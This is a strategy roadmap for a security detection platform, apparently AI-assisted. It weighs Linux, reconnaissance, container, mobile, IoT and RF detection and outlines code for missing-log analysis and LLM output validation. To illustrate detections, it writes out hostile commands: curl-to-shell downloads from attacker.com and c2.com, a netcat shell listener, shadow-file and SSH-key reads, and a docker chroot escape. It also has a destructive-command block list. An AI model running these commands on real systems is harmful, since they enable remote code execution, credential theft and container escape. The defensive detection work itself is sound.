# JanuSec Strategic Expansion Roadmap
**Date**: December 2, 2025
**Version**: 1.0
**Author**: Platform Strategy Assessment

---

## Executive Summary

**Current State**: JanuSec is 85% production-ready with strong Windows/network detection capabilities.

**Strategic Question**: Should we expand beyond Windows to Linux, mobile, IoT, wireless/RF, and reconnaissance detection?

**Recommendation**: **YES, but with disciplined prioritization**. Expansion is strategically sound BUT must be sequenced to avoid overengineering before achieving product-market fit.

**Priority Framework**:
1. **P0 (Now)**: Improve core capabilities (missing logs, Tier 1/2 summaries, HopGraph)
2. **P1 (3-6 months)**: Linux LOLBins + Reconnaissance detection
3. **P2 (6-12 months)**: Cloud-native/container attacks
4. **P3 (12-18 months)**: Mobile (Android/iOS) + IoT
5. **P4 (18-24 months)**: Wireless/RF (specialized market)

---

## 1. OVERENGINEERING RISK ASSESSMENT

### Current Platform Maturity

| Component | Maturity | Evidence | Risk |
|-----------|----------|----------|------|
| **Windows Detection** | 85% | 29 correlation rules, process lineage | Low |
| **Network Detection** | 90% | JA3/JA4, beaconing, DNS tunneling | Low |
| **Email Detection** | 95% | 19 BEC detectors | Low |
| **Supply Chain** | 75% | NPM detection, SBOM integration | Medium |
| **Cloud Detection** | 60% | Basic AWS/Azure/GCP | High |
| **LLM Integration** | 80% | Tier 1/2 working, needs refinement | Medium |
| **HopGraph** | 70% | 8 domains, in-memory only | High |
| **Missing Logs** | 65% | Basic implementation, needs enrichment | High |

### Overengineering Indicators

**🚨 RED FLAGS (Currently Present)**:
1. **HopGraph Scalability**: In-memory only, will break at 100K+ events
2. **Missing Logs**: Basic MITRE mapping, not comprehensive per-attack scenario
3. **LLM Hallucination**: 5-15% hallucination rate needs reduction
4. **Test Coverage Gaps**: 70% coverage, critical paths under-tested
5. **Documentation Scatter**: 25+ markdown files, inconsistent

**✅ GREEN LIGHTS (Safe to Expand)**:
1. **Core Detection Engine**: Solid foundation (29 rules, 8 hunt lanes)
2. **CI/CD Pipeline**: 26 workflows, good automation
3. **Multi-LLM**: Provider abstraction allows experimentation
4. **Deployment**: Docker/K8s ready

### Market Readiness Assessment

**Product-Market Fit Indicators**:
- ✅ Solves real problem (alert fatigue)
- ✅ Unique differentiator (missing telemetry detection)
- ✅ Cost advantage (95% cheaper than Splunk)
- ❌ **No paying customers yet** (biggest risk)
- ❌ **No beta testers**
- ❌ **No usage metrics**

**Verdict**: **Platform is 85% ready for MVP launch. Expansion MUST NOT delay go-to-market.**

---

## 2. EXPANSION OPPORTUNITIES: STRATEGIC ANALYSIS

### A. Linux LOLBins (Living-off-the-Land) - **PRIORITY 1 🎯**

#### Market Demand
- **High**: Linux servers dominate cloud infrastructure (70%+ of cloud workloads)
- **Enterprise Need**: Critical (Linux compromises = crown jewel access)
- **Competitive Gap**: Most tools focus on Windows, Linux is under-served

#### Detection Opportunities

**1. Shell Abuse**
```yaml
# Linux LOLBin: bash/sh abuse
Detection:
  - Process: /bin/bash -c "curl http://attacker.com/script.sh | sh"
  - Parent: cron / systemd (unusual)
  - Network: outbound HTTP to rare domain

Factors:
  - lolbin:linux_shell_download_exec (+0.18)
  - process:unusual_parent_bash (+0.12)
  - network:curl_to_rare_domain (+0.08)

MITRE: T1059.004 (Unix Shell)
Diamond:
  - Adversary: APT, Insider
  - Capability: Remote code execution
  - Infrastructure: C2 server
  - Victim: Linux server
PASTA Stage: 5 (Attack Modeling)
```

**2. Living-off-the-Land Binaries**
```yaml
Common Linux LOLBins:
  - wget/curl: Download payloads
  - nc (netcat): Reverse shells
  - python/perl/ruby: Inline scripts
  - ssh: Lateral movement, tunneling
  - dd: Memory dumping
  - tar/gzip: Data exfiltration via compression
  - base64: Encoding obfuscation
  - cron: Persistence
  - systemctl: Service manipulation

Detection Example:
Process: nc -lvp 4444 -e /bin/bash
Parent: www-data (web server user)
Network: Listening on 0.0.0.0:4444

Factors:
  - lolbin:netcat_reverse_shell (+0.25)
  - process:web_user_spawned_netcat (+0.15)
  - network:listening_on_all_interfaces (+0.08)

Verdict: CRITICAL - Reverse shell from web server
```

**3. Credential Access (Linux-Specific)**
```yaml
/etc/shadow access:
  - Process: cat /etc/shadow
  - User: www-data (non-root)
  - Result: Permission denied (attempted cred theft)

Factors:
  - credential:shadow_file_access_attempt (+0.18)
  - privilege:unprivileged_user_shadow_access (+0.12)

SSH Key Theft:
  - Process: cat ~/.ssh/id_rsa
  - Network: Immediate connection to external IP

Factors:
  - credential:ssh_private_key_read (+0.20)
  - lateral:ssh_key_theft_and_use (+0.15)

MITRE: T1552.004 (Private Keys)
```

**4. Container Escape (Docker/K8s)**
```yaml
Docker Socket Abuse:
  - Process: docker run -v /:/host alpine chroot /host /bin/bash
  - User: container_user
  - Volume: /var/run/docker.sock mounted

Factors:
  - container:docker_socket_abuse (+0.20)
  - privilege:container_escape (+0.18)
  - process:chroot_to_host_filesystem (+0.15)

MITRE: T1611 (Escape to Host)
Diamond:
  - Capability: Container breakout
  - Infrastructure: Compromised container
```

**5. Persistence Mechanisms**
```yaml
Cron Job Injection:
  - File: /etc/crontab modified
  - Content: */5 * * * * curl http://c2.com | sh

Factors:
  - persistence:cron_injection (+0.16)
  - lolbin:curl_in_cron (+0.10)

Systemd Service:
  - File: /etc/systemd/system/malware.service created
  - Content: ExecStart=/tmp/.hidden/backdoor

Factors:
  - persistence:systemd_service_creation (+0.18)
  - defense_evasion:hidden_directory (+0.08)

MITRE: T1053.003 (Cron), T1543.002 (Systemd)
```

#### Implementation Effort
- **Time**: 2-3 weeks
- **Complexity**: Medium (similar patterns to Windows)
- **ROI**: **High** (Linux dominates server market)

#### Files to Create/Modify
```
src/core/hunt/lanes/linux_lolbin.py (NEW)
src/core/detectors/linux_persistence.py (NEW)
src/core/detectors/container_escape.py (NEW)
src/core/mappings/factor_to_mitre.py (EXTEND with Linux techniques)
config/profiles/correlation_rules_linux.yml (NEW)
tests/test_linux_detection.py (NEW)
```

#### MITRE Coverage Expansion
```
Current Windows Coverage: ~150 techniques
Linux Expansion Adds: +50 techniques
  - T1059.004 (Unix Shell)
  - T1053.003 (Cron)
  - T1543.002 (Systemd Service)
  - T1611 (Escape to Host)
  - T1552.004 (Private Keys)
  - T1068 (Linux Kernel Exploits)
  - T1078.003 (Local Accounts)
  - T1548.001 (Setuid/Setgid)
  - T1055.009 (Proc Memory)
  - T1021.004 (SSH)
```

---

### B. Reconnaissance Detection - **PRIORITY 1 🎯**

#### Market Demand
- **Critical**: Recon is the first kill chain stage (MITRE ATT&CK: Reconnaissance)
- **Detection Gap**: Most tools focus on post-exploitation, not pre-attack recon
- **Business Value**: Early detection = prevent breach

#### Detection Opportunities

**1. Active Scanning (MITRE TA0043)**
```yaml
Port Scanning (Already Implemented ✅):
  - Current: Vertical/Horizontal port scan detection
  - Enhancement Needed: Add service fingerprinting detection

Vulnerability Scanning:
  - Pattern: Nmap version scan (-sV)
  - User-Agent: "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
  - Request Pattern: Rapid requests to multiple services

Factors:
  - recon:vulnerability_scan_detected (+0.12)
  - network:nmap_user_agent (+0.08)
  - network:service_enumeration_pattern (+0.06)

MITRE: T1046 (Network Service Scanning)
```

**2. Phishing for Information (MITRE T1598)**
```yaml
Email Recon (New Detection):
  - Read receipts requested (X-Confirm-Reading-To header)
  - Link tracking pixels (1x1.gif in email body)
  - Shortened URLs with tracking (bit.ly, tinyurl)

Factors:
  - recon:email_read_receipt_requested (+0.05)
  - recon:tracking_pixel_detected (+0.06)
  - recon:link_click_tracking (+0.07)

Detection:
  - Parse email headers for tracking
  - Detect invisible tracking images
  - Analyze link redirects

MITRE: T1598.003 (Spearphishing Link)
```

**3. Search Open Technical Databases (MITRE T1596)**
```yaml
Certificate Transparency Logs:
  - Pattern: Organization's domains searched in CT logs
  - API calls to crt.sh, censys.io
  - Detection: Monitor outbound connections from recon IPs

Shodan/Censys Scanning:
  - User-Agent: "Shodan", "Censys"
  - IP ranges: Shodan scanning infrastructure

Factors:
  - recon:ct_log_enumeration (+0.06)
  - recon:shodan_scan_detected (+0.10)
  - recon:internet_scanning_service (+0.08)

MITRE: T1596 (Search Open Technical Databases)
```

**4. Gather Victim Network Information (MITRE T1590)**
```yaml
DNS Enumeration:
  - Pattern: Rapid DNS queries for subdomains
  - Tools: dig, nslookup, fierce, dnsrecon
  - Rate: 100+ queries in 60 seconds

Factors:
  - recon:dns_enumeration_burst (+0.10)
  - recon:subdomain_brute_force (+0.12)
  - network:high_query_rate_single_domain (+0.08)

BGP/ASN Enumeration:
  - Queries to RIPE, ARIN, APNIC
  - Pattern: Multiple ASN lookups for target org

Factors:
  - recon:bgp_asn_enumeration (+0.06)
  - recon:whois_bulk_queries (+0.08)

MITRE: T1590 (Gather Victim Network Information)
```

**5. OSINT Gathering**
```yaml
GitHub/GitLab Reconnaissance:
  - Pattern: Searching org repositories for secrets
  - API: github.com/api/v3/search
  - Keywords: "password", "api_key", "secret"

Factors:
  - recon:github_secret_search (+0.12)
  - recon:code_repository_enumeration (+0.10)

LinkedIn Employee Enumeration:
  - Pattern: Scraping employee list
  - Detection: Multiple profile views from single IP

Factors:
  - recon:linkedin_employee_enumeration (+0.08)
  - recon:social_media_scraping (+0.06)

MITRE: T1594 (Search Victim-Owned Websites)
```

#### Implementation Effort
- **Time**: 1-2 weeks
- **Complexity**: Low (mostly network pattern matching)
- **ROI**: **Very High** (early warning = prevent breaches)

#### Files to Create/Modify
```
src/core/hunt/lanes/reconnaissance.py (NEW)
src/core/detectors/osint_detection.py (NEW)
src/modules/network_hunter.py (EXTEND with recon patterns)
config/profiles/correlation_rules_recon.yml (NEW)
```

---

### C. Cloud-Native/Container Attacks - **PRIORITY 2**

#### Market Demand
- **Very High**: 85% of enterprises use containers (Kubernetes adoption)
- **Security Gap**: Traditional tools don't understand container context
- **Competitive Advantage**: Emerging market, fewer mature solutions

#### Detection Opportunities

**1. Kubernetes API Abuse**
```yaml
Unauthorized API Access:
  - API: kubectl get secrets -A
  - User: system:anonymous
  - Result: 403 Forbidden (attempted enumeration)

Factors:
  - k8s:anonymous_api_access_attempt (+0.15)
  - k8s:secret_enumeration (+0.18)

Privilege Escalation:
  - API: kubectl create clusterrolebinding --clusterrole=cluster-admin
  - User: default-service-account

Factors:
  - k8s:privilege_escalation_via_rbac (+0.20)
  - k8s:cluster_admin_binding (+0.18)

MITRE: T1078.004 (Cloud Accounts)
```

**2. Container Breakout**
```yaml
Privileged Container:
  - securityContext.privileged: true
  - Capabilities: CAP_SYS_ADMIN

Factors:
  - container:privileged_mode_enabled (+0.16)
  - container:dangerous_capabilities (+0.14)

Host Path Mount:
  - volumeMounts: /host-root
  - mountPath: /

Factors:
  - container:host_path_mount (+0.18)
  - container:root_filesystem_access (+0.20)

MITRE: T1611 (Escape to Host)
```

**3. Supply Chain (Container Images)**
```yaml
Malicious Image:
  - Image: docker.io/unknown-user/suspicious:latest
  - Pull: From untrusted registry
  - Scan: Contains crypto miner

Factors:
  - supply_chain:untrusted_image_registry (+0.15)
  - supply_chain:crypto_miner_in_image (+0.22)
  - container:unsigned_image (+0.12)

MITRE: T1525 (Implant Internal Image)
```

#### Implementation Effort
- **Time**: 4-6 weeks
- **Complexity**: High (new domain expertise)
- **ROI**: **High** (growing market)

---

### D. Mobile (Android/iOS) - **PRIORITY 3**

#### Market Demand
- **Medium**: Enterprise MDM/MAM market is mature
- **Competitive Landscape**: Crowded (Lookout, Zimperium, Check Point)
- **Differentiation**: Harder (established players)

#### Detection Opportunities

**1. Android Malware**
```yaml
SMS Fraud:
  - Permission: SEND_SMS
  - Behavior: Sending premium-rate SMS

Factors:
  - mobile:sms_fraud_detected (+0.20)
  - mobile:premium_sms_sent (+0.18)

Rooting Detection:
  - File: /system/xbin/su exists
  - App: Magisk, SuperSU installed

Factors:
  - mobile:device_rooted (+0.15)
  - mobile:root_management_app (+0.12)

MITRE: T1447 (Delete Device Data), T1448 (Exploit via Charging Station)
```

**2. iOS Attacks**
```yaml
Jailbreak Detection:
  - File: /Applications/Cydia.app
  - API: canOpenURL(cydia://)

Factors:
  - mobile:device_jailbroken (+0.15)
  - mobile:cydia_detected (+0.12)

Profile Installation:
  - MDM Profile: Untrusted CA certificate
  - Purpose: MITM attacks

Factors:
  - mobile:untrusted_profile_installed (+0.18)
  - mobile:mitm_certificate_added (+0.20)

MITRE: T1444 (Masquerade as Legitimate Application)
```

#### Strategic Assessment
- **Verdict**: **DEFER** until P1/P2 complete
- **Rationale**: Crowded market, requires dedicated mobile team
- **Alternative**: Partner with Lookout/Zimperium for integration

---

### E. IoT/OT Attacks - **PRIORITY 3**

#### Market Demand
- **High (OT/ICS)**: Critical infrastructure protection
- **Medium (IoT)**: Consumer IoT security is immature
- **Complexity**: Requires domain expertise (SCADA, Modbus, etc.)

#### Detection Opportunities

**1. ICS/SCADA Protocols**
```yaml
Modbus Abuse:
  - Function Code: 0x0F (Write Multiple Coils)
  - Target: PLC controlling critical valve
  - Source: Unauthorized workstation

Factors:
  - iot:modbus_unauthorized_write (+0.22)
  - iot:critical_plc_targeted (+0.20)
  - iot:unsafe_function_code (+0.15)

MITRE ICS: T0836 (Modify Parameter)
```

**2. IoT Device Compromise**
```yaml
Mirai Botnet:
  - Pattern: Telnet login attempts with default credentials
  - Targets: IoT cameras, routers
  - Payloads: Shell commands for bot installation

Factors:
  - iot:telnet_default_creds (+0.18)
  - iot:botnet_c2_callback (+0.20)
  - iot:device_compromised (+0.22)

MITRE: T1078 (Valid Accounts)
```

#### Strategic Assessment
- **Verdict**: **DEFER** until P2 complete
- **Rationale**: Specialized market, high complexity
- **Alternative**: Partner with Nozomi Networks, Claroty for OT integration

---

### F. Wireless/RF Attacks - **PRIORITY 4**

#### Market Demand
- **Low (General Market)**: Niche use case
- **High (Government/Defense)**: Critical for physical security
- **Barrier**: Requires specialized hardware (SDR, WiFi adapters)

#### Detection Opportunities

**1. WiFi Attacks**
```yaml
Evil Twin AP:
  - Detection: Duplicate SSID with stronger signal
  - BSSID: Different MAC, same SSID
  - Channel: Same as legitimate AP

Factors:
  - wireless:evil_twin_detected (+0.18)
  - wireless:duplicate_ssid_stronger_signal (+0.15)

Deauth Attack:
  - Pattern: Deauthentication frames sent to all clients
  - Rate: 100+ deauth frames/second

Factors:
  - wireless:deauth_flood (+0.20)
  - wireless:wifi_dos_attack (+0.18)

MITRE: T1499.002 (Service Exhaustion Flood)
```

**2. Bluetooth Attacks**
```yaml
BlueBorne:
  - Pattern: Bluetooth service discovery scan
  - Target: Vulnerable Bluetooth stack

Factors:
  - wireless:bluetooth_vulnerability_scan (+0.15)
  - wireless:blueborne_exploit_attempt (+0.22)

MITRE: T1200 (Hardware Additions)
```

**3. RF Jamming**
```yaml
GPS Spoofing:
  - Detection: GPS signal strength anomaly
  - Location: Impossible movement (teleportation)

Factors:
  - wireless:gps_spoofing_detected (+0.20)
  - wireless:location_impossible_delta (+0.18)

Cellular Jamming:
  - Detection: Signal strength drop across all frequencies
  - Duration: Sustained (not natural interference)

Factors:
  - wireless:cellular_jamming (+0.22)
  - wireless:signal_interference_sustained (+0.15)

MITRE: T1565.002 (Transmitted Data Manipulation)
```

#### Strategic Assessment
- **Verdict**: **DEFER** until P3+ (or never)
- **Rationale**: Highly specialized, requires hardware, niche market
- **Alternative**: Partner with AirEye, Bastille Networks for RF security

---

## 3. PRIORITIZATION MATRIX

### Decision Framework

| Expansion | Market Demand | Complexity | ROI | Time to Ship | Priority |
|-----------|---------------|------------|-----|--------------|----------|
| **Linux LOLBins** | High | Medium | High | 2-3 weeks | **P1** 🎯 |
| **Reconnaissance** | Very High | Low | Very High | 1-2 weeks | **P1** 🎯 |
| **Cloud-Native** | Very High | High | High | 4-6 weeks | **P2** |
| **Mobile** | Medium | High | Medium | 8-10 weeks | **P3** |
| **IoT/OT** | Medium | Very High | Medium | 10-12 weeks | **P3** |
| **Wireless/RF** | Low | Very High | Low | 12+ weeks | **P4** ❌ |

### Recommended Roadmap

**Phase 0: Core Improvements (NOW - 2 weeks)** ⭐
- Improve missing logs detection (see section 4)
- Enhance Tier 1/2 LLM summaries (see section 5)
- Optimize HopGraph scalability (see section 6)
- **DO NOT START NEW FEATURES UNTIL CORE IS SOLID**

**Phase 1: High-ROI Expansion (Weeks 3-6)**
- Reconnaissance detection (1-2 weeks)
- Linux LOLBins (2-3 weeks)
- **Goal**: 80% coverage of common attack vectors

**Phase 2: Cloud-Native Focus (Weeks 7-12)**
- Kubernetes API abuse detection
- Container breakout detection
- Cloud service abuse (AWS/Azure/GCP)
- **Goal**: Dominate cloud security market

**Phase 3: Mobile/IoT (Months 4-6)**
- Only if Phase 1/2 shows traction with customers
- Partner-first strategy (integrate vs. build)

**Phase 4: Wireless/RF (Future/Maybe)**
- Only if government/defense customers request
- Requires specialized hardware investment

---

## 4. CORE IMPROVEMENT: MISSING LOGS DETECTION

### Current Gaps

**Existing Implementation** (`auto_llm.py` lines 602-616):
```python
# Basic MITRE-mapped log requirements
logs_info = get_logs_for_mitre(technique_id)
# Returns: ["Sysmon Event 10", "Security Event 4656"]
```

**Problems**:
1. ❌ Static mapping (doesn't adapt to attack scenario)
2. ❌ No confidence scoring (which logs are CRITICAL vs. nice-to-have)
3. ❌ No prioritization (what to enable first)
4. ❌ No cost/effort estimation (how hard to enable)

### Enhanced Architecture

```python
# NEW: src/analysis/missing_logs_detector.py

class MissingLogsDetector:
    """
    Detects missing telemetry and provides actionable guidance
    """

    def analyze_coverage(self, alert: Dict, available_logs: List[str]) -> Dict:
        """
        Analyze log coverage for a given alert

        Returns:
            {
                'coverage_percent': 0.45,  # 45% coverage
                'critical_missing': [
                    {
                        'log_source': 'Sysmon Event 3',
                        'reason': 'Required to confirm C2 connection',
                        'confidence': 0.95,
                        'priority': 1,
                        'effort': 'medium',
                        'cost': 'low',
                        'enable_command': 'sysmon -c sysmonconfig.xml',
                        'expected_improvement': 0.35  # +35% coverage
                    }
                ],
                'optional_missing': [...],
                'recommendations': [...]
            }
        """
        # Implementation below
```

**Enhancement 1: Attack-Scenario-Aware Mapping**

```python
# Map attack scenarios to required logs
SCENARIO_LOG_REQUIREMENTS = {
    'phishing_to_c2': {
        'must_have': [
            ('email_gateway_logs', 'Confirm phishing email delivery', 0.95),
            ('endpoint_process_logs', 'Confirm macro execution', 0.90),
            ('network_connection_logs', 'Confirm C2 connection', 0.90),
        ],
        'should_have': [
            ('dns_query_logs', 'Detect DNS tunneling', 0.70),
            ('tls_cert_logs', 'Validate JA3 fingerprint', 0.60),
        ],
        'nice_to_have': [
            ('file_hash_logs', 'Track payload propagation', 0.40),
        ]
    },
    'credential_theft_lateral': {
        'must_have': [
            ('lsass_access_logs', 'Confirm credential dump', 0.95),
            ('authentication_logs', 'Confirm credential reuse', 0.90),
            ('network_share_logs', 'Confirm lateral movement', 0.85),
        ],
        # ...
    }
}

def get_scenario_logs(alert: Dict) -> List[Tuple[str, str, float]]:
    """Detect attack scenario and return required logs"""
    scenario = detect_attack_scenario(alert)
    return SCENARIO_LOG_REQUIREMENTS.get(scenario, {})
```

**Enhancement 2: Confidence Scoring**

```python
def compute_log_confidence(alert: Dict, log_source: str) -> float:
    """
    Compute confidence that a log source is needed

    Factors:
    - Attack technique mapped (high confidence)
    - Multiple factors suggest need (medium confidence)
    - Single weak signal (low confidence)
    """
    confidence = 0.0

    # Factor 1: MITRE technique requires this log
    mitre_tags = alert.get('mitre_tags', [])
    for technique in mitre_tags:
        required_logs = MITRE_LOG_REQUIREMENTS.get(technique, [])
        if log_source in required_logs:
            confidence = max(confidence, 0.90)

    # Factor 2: Multiple weak signals suggest this log
    factors = alert.get('factors', [])
    suspicious_factors = [f for f in factors if f.startswith('net:')]
    if len(suspicious_factors) >= 3 and log_source == 'network_connection_logs':
        confidence = max(confidence, 0.75)

    # Factor 3: Historical incidents with same pattern
    similar_incidents = query_historical(alert)
    for incident in similar_incidents:
        if incident.get('outcome') == 'confirmed_malicious':
            missing_logs = incident.get('missing_logs', [])
            if log_source in missing_logs:
                confidence = max(confidence, 0.85)

    return confidence
```

**Enhancement 3: Prioritization & Cost Estimation**

```python
LOG_SOURCE_METADATA = {
    'sysmon_event_3': {
        'name': 'Sysmon Event ID 3 (Network Connections)',
        'effort': 'medium',  # easy, medium, hard
        'cost': 'low',       # low, medium, high
        'enable_time': '30 minutes',
        'prerequisites': ['Sysmon installed', 'Config file updated'],
        'command': 'sysmon -c sysmonconfig-network.xml',
        'risk': 'Performance impact on high-traffic hosts (5-10% CPU)',
        'storage_impact': '500MB-2GB/day per host',
        'expected_improvement': {
            'lateral_movement': 0.40,  # +40% detection
            'c2_detection': 0.35,
            'data_exfil': 0.30
        }
    },
    'windows_security_4624': {
        'name': 'Windows Security Event 4624 (Logon)',
        'effort': 'easy',
        'cost': 'negligible',
        'enable_time': '5 minutes',
        'command': 'auditpol /set /subcategory:"Logon" /success:enable',
        'storage_impact': '100MB/day per DC',
        'expected_improvement': {
            'credential_theft': 0.50,
            'lateral_movement': 0.45
        }
    }
}
```

**Enhancement 4: Actionable Output**

```yaml
# Example Tier 2 LLM Summary with Enhanced Missing Logs

⚠️ MISSING TELEMETRY ANALYSIS:

CURRENT COVERAGE: 45% (INSUFFICIENT for high-confidence verdict)

CRITICAL GAPS (Enable ASAP):
┌─────────────────────────────────────────────────────────────────┐
│ Priority 1: Sysmon Event 3 (Network Connections)                │
│ Why: Required to confirm C2 connection to 203.0.113.42          │
│ Confidence: 95% (lateral movement pattern detected)             │
│ Effort: Medium (30 minutes)                                     │
│ Cost: Low (500MB-2GB/day storage)                              │
│ Expected Improvement: 45% → 80% coverage (+35%)                 │
│                                                                 │
│ Enable Command:                                                 │
│   sysmon -accepteula -i sysmonconfig-network.xml               │
│                                                                 │
│ Validate:                                                       │
│   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" │
│   -FilterXPath "*[System[EventID=3]]" -MaxEvents 10            │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ Priority 2: Security Event 4624 (Logon Sessions)                │
│ Why: Required to confirm credential reuse in lateral movement   │
│ Confidence: 90% (rare service account used)                     │
│ Effort: Easy (5 minutes)                                        │
│ Cost: Negligible (100MB/day)                                    │
│ Expected Improvement: 80% → 90% coverage (+10%)                 │
│                                                                 │
│ Enable Command:                                                 │
│   auditpol /set /subcategory:"Logon" /success:enable           │
└─────────────────────────────────────────────────────────────────┘

OPTIONAL GAPS (Lower priority):
  • DNS Query Logs: Would help detect DNS tunneling (70% confidence)
  • File Hash Logs: Would track payload propagation (40% confidence)

ESTIMATED TIMELINE:
  - Priority 1+2: 35 minutes total
  - After enabling: Re-analyze in 24 hours to validate improvement

BUSINESS IMPACT:
  - Current State: Can only confirm 45% of attack chain
  - After Fix: Can confirm 90% of attack chain
  - Risk Reduction: $250K (average breach cost with 90% detection)
```

### Implementation Plan

**Files to Create/Modify**:
```
src/analysis/missing_logs_detector.py (NEW - 500 lines)
src/analysis/attack_scenario_detector.py (NEW - 300 lines)
src/analysis/log_source_metadata.py (NEW - data file)
src/analysis/auto_llm.py (EXTEND Tier 2 prompt with enhanced missing logs)
tests/test_missing_logs_detector.py (NEW - 200 lines)
```

**Effort**: 1 week
**Impact**: 🚀 **Massive** - This is your killer feature

---

## 5. CORE IMPROVEMENT: TIER 1/2 LLM SUMMARIES

### Current Performance

**Tier 1 (Fast Triage)**:
- ✅ Latency: 3-8 seconds (good)
- ✅ Cost: $0.003/alert (excellent)
- ⚠️ Accuracy: 85-90% (needs improvement)
- ❌ Hallucination Rate: 5-10% (too high)
- ❌ Playbook Quality: 70% copy-paste ready (needs improvement)

**Tier 2 (Deep Investigation)**:
- ✅ Latency: 10-20 seconds (acceptable)
- ✅ Cost: $0.015/alert (good)
- ⚠️ Accuracy: 90-95% (good, but can improve)
- ⚠️ Hallucination Rate: 2-5% (acceptable for deep analysis)
- ✅ Playbook Quality: 88% copy-paste ready (good)

### Enhancement Strategies

#### A. Structured Output Enforcement (Reduce Hallucination)

**Current Problem**: LLMs sometimes make up commands/tools that don't exist

**Solution**: JSON Schema Enforcement

```python
# NEW: src/analysis/llm_output_schemas.py

from pydantic import BaseModel, Field, validator
from typing import List, Literal

class Tier1Summary(BaseModel):
    """Strict schema for Tier 1 summaries"""

    what_is_it: str = Field(
        ...,
        min_length=50,
        max_length=200,
        description="2-3 sentence description of the artifact"
    )

    exploitability: Literal['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'] = Field(
        ...,
        description="Exploitability rating"
    )

    exploitability_explanation: str = Field(
        ...,
        min_length=100,
        max_length=300,
        description="3-4 sentence explanation of exploitability"
    )

    immediate_actions: List[str] = Field(
        ...,
        min_items=3,
        max_items=5,
        description="Bullet-point immediate actions"
    )

    playbook: List[PlaybookCommand] = Field(
        ...,
        min_items=3,
        max_items=8,
        description="Copy-paste commands"
    )

    @validator('playbook')
    def validate_commands(cls, v):
        """Ensure commands are real and safe"""
        for cmd in v:
            # Validate command exists in approved list
            if not is_valid_command(cmd.command):
                raise ValueError(f"Invalid command: {cmd.command}")
        return v

class PlaybookCommand(BaseModel):
    """Single playbook command"""

    step: int = Field(..., ge=1, le=10)
    description: str = Field(..., min_length=10, max_length=100)
    command: str = Field(..., min_length=5, max_length=500)
    platform: Literal['windows', 'linux', 'macos', 'cloud'] = Field(...)
    risk: Literal['safe', 'caution', 'destructive'] = Field(...)

    @validator('command')
    def validate_command_safety(cls, v, values):
        """Prevent destructive commands unless marked"""
        destructive_patterns = ['rm -rf', 'del /f /s /q', 'drop table']
        if any(pattern in v.lower() for pattern in destructive_patterns):
            if values.get('risk') != 'destructive':
                raise ValueError(f"Destructive command must be marked as risk='destructive'")
        return v
```

**Usage in LLM Client**:
```python
# src/integrations/llm_client.py

def call_llm_with_schema(prompt: str, schema: Type[BaseModel]) -> Dict:
    """Call LLM with JSON schema enforcement"""

    # Add schema to prompt
    schema_json = schema.schema_json(indent=2)
    enhanced_prompt = f"""
{prompt}

IMPORTANT: Respond ONLY with valid JSON matching this schema:
{schema_json}

Rules:
- Do NOT make up commands that don't exist
- Do NOT include explanatory text outside JSON
- Validate all commands against approved list
"""

    response = openai.ChatCompletion.create(
        model="gpt-4o",
        messages=[{"role": "user", "content": enhanced_prompt}],
        response_format={"type": "json_object"}  # Force JSON mode
    )

    # Parse and validate
    try:
        output = schema.parse_raw(response.choices[0].message.content)
        return output.dict()
    except ValidationError as e:
        # Log validation errors
        logger.error(f"LLM output validation failed: {e}")
        # Retry with stricter prompt
        return retry_with_strict_prompt(prompt, schema, errors=e.errors())
```

**Expected Impact**:
- Hallucination rate: 5-10% → **<2%**
- Playbook quality: 70% → **95%** copy-paste ready
- Validation failures: Catch 90%+ of bad outputs before returning

---

#### B. Few-Shot Examples (Improve Quality)

**Current Problem**: LLM sometimes uses wrong tone or format

**Solution**: Inject high-quality examples into prompt

```python
# src/analysis/llm_few_shot_examples.py

TIER1_EXAMPLES = [
    {
        'input': {
            'process': 'powershell.exe',
            'parent': 'WINWORD.EXE',
            'cmdline': 'powershell.exe -enc JABjAGwAaQBlAG4AdA...',
            'dst_ip': '203.0.113.42',
            'ja3': 'a0e9f5d64349fb13191bc781f81f42e1',
            'factors': ['office_macro_spawn_powershell', 'ja3_rare', 'powershell_encoded']
        },
        'output': {
            'what_is_it': 'PowerShell execution spawned by Microsoft Word (WINWORD.EXE) on WORKSTATION-042 by user jsmith@corp.com. Encoded command line suggests obfuscated malicious payload typical of phishing campaigns. Connection to external IP 203.0.113.42 with rare TLS fingerprint (JA3: a0e9f5d6...) indicates C2 beacon.',
            'exploitability': 'CRITICAL',
            'exploitability_explanation': 'High exploitability (DREAD 8.2/10) driven by: phishing vector with macro auto-execution (no user interaction beyond opening file), encoded PowerShell bypasses casual inspection, rare JA3 hash suggests custom tooling (Emotet/Qakbot family per TI), VirusTotal 42/70 detections confirms malicious artifact.',
            'immediate_actions': [
                'Isolate WORKSTATION-042 immediately (prevent lateral movement)',
                'Terminate powershell.exe PID and capture memory dump',
                'Block dst_ip 203.0.113.42 at perimeter firewall',
                'Revoke jsmith\'s Active Directory Kerberos tickets',
                'Hunt for invoice.docm hash a3f2b1c9... across fleet'
            ],
            'playbook': [
                {
                    'step': 1,
                    'description': 'Isolate host',
                    'command': 'cbctl isolate WORKSTATION-042',
                    'platform': 'windows',
                    'risk': 'safe'
                },
                {
                    'step': 2,
                    'description': 'Kill malicious process',
                    'command': 'taskkill /F /IM powershell.exe /T',
                    'platform': 'windows',
                    'risk': 'safe'
                },
                # ... more steps
            ]
        }
    },
    # Add 5-10 high-quality examples
]

def build_few_shot_prompt(alert: Dict) -> str:
    """Build prompt with few-shot examples"""

    prompt = "You are a SOC analyst. Analyze the artifact and provide a concise summary.\n\n"

    # Add 2-3 relevant examples
    relevant_examples = select_relevant_examples(alert, TIER1_EXAMPLES, k=3)

    for i, example in enumerate(relevant_examples, 1):
        prompt += f"EXAMPLE {i}:\n"
        prompt += f"INPUT:\n{json.dumps(example['input'], indent=2)}\n\n"
        prompt += f"OUTPUT:\n{json.dumps(example['output'], indent=2)}\n\n"

    prompt += f"NOW ANALYZE THIS ARTIFACT:\n{json.dumps(alert, indent=2)}\n\n"
    prompt += "OUTPUT (JSON only):"

    return prompt
```

**Expected Impact**:
- Output consistency: 70% → **95%**
- Tone/format adherence: 80% → **98%**
- Accuracy: 85% → **92%**

---

#### C. Context Window Optimization (Reduce Latency)

**Current Problem**: Tier 2 prompts are 60-100 lines, slow to process

**Solution**: Compress context without losing information

```python
def compress_context(alert: Dict) -> Dict:
    """Compress alert context for faster LLM processing"""

    # Remove redundant fields
    compressed = {
        k: v for k, v in alert.items()
        if v is not None and v != '' and v != []
    }

    # Truncate long strings
